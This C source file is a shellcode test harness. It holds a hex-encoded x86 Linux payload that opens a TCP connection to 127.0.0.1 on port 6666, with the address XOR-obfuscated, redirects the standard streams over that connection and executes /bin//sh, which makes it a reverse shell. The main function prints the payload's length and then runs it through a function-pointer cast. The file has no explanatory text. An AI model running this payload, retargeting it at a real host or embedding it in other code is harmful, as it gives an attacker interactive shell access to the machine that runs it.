#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\xb0\x66\xb3\x01\xb1\x02\x53\x51\x8d\x0c\x24\xcd\x80\x5b\xb9\x80\xff\xff\xfe\x83\xf1\xff\xb2\x10\x51\x66\x68\x1a\x0a\x66\x53\x89\xe1\x52\x51\x50\x31\xc0\xb0\x66\x43\x89\xe1\xcd\x80\x87\xd9\x5b\x49\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x89\xca\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
